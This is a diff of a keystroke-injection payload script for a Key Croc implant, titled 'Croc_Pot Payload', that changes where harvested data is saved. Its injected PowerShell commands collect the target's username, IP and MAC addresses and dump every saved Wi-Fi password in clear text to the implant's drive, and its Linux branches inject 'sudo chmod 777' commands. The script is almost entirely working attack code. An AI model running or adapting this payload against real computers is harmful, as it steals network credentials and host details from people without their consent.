@@ -1,9 +1,9 @@
 # Title:         Croc_Pot Payload
 # Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
 #                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
-#                save to loot folder
+#                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.0.8
+# Version:       1.0.9
 # Category:      Key Croc
 #
 #
@@ -12,9 +12,9 @@ MATCH crocpot
 CROC_PW=hak5croc      #<-----Edit KEYCROC_PASSWD_HERE
 PC_PW=LINUX           #<-----Edit LINUX-PC_PASSWD_HERE
 #
-CROC_OS=/root/udisk/loot/Croc_OS.txt
+CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
 cat > ${CROC_OS}
-rm -f /root/udisk/loot/Croc_OS_wind.txt /root/udisk/loot/Croc_OS_ip.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
+rm /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
 ATTACKMODE AUTO_ETHERNET
 LED ATTACK
 GET TARGET_OS
@@ -34,16 +34,16 @@ case $TARGET_OS in
            Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
            Q ENTER
            sleep 1
-           Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
+           Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
            Q ENTER
            sleep 1
-           Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
+           Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
            Q ENTER
            sleep 1
-           Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
+           Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
            Q ENTER
            sleep 2
-           Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
+           Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
            Q ENTER
            sleep 3
            Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
@@ -61,8 +61,8 @@ case $TARGET_OS in
            echo "$TARGET_IP" >> ${CROC_OS}
            echo "$TARGET_HOSTNAME" >> ${CROC_OS}
            echo "$HOST_IP" >> ${CROC_OS}
-           $(sed -i 's/\r//g' /root/udisk/loot/Croc_OS_wind.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
-           $(sed -i '0,/./s/^.//' /root/udisk/loot/Croc_OS_wind.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+           $(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+           $(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
            Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
       MACOS)
@@ -97,8 +97,8 @@ raspberrypi)
            Q STRING "terminal"
            Q ENTER
            Q ENTER
-           sleep 1
-           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/loot/Croc_OS_ip.txt"
+           sleep 2
+           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
            Q ENTER
            Q STRING "whoami | tee \${PC_USER}"
            Q ENTER
@@ -145,7 +145,7 @@ raspberrypi)
            Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
            Q ENTER
            sleep 1
-           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/loot/Croc_OS_ip.txt"
+           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
            Q ENTER
            Q STRING "whoami | tee \${PC_USER}"
            Q ENTER
@@ -197,7 +197,7 @@ raspberrypi)
            Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
            Q ENTER
            sleep 1
-           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/loot/Croc_OS_ip.txt"
+           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
            Q ENTER
            Q STRING "whoami | tee \${PC_USER}"
            Q ENTER
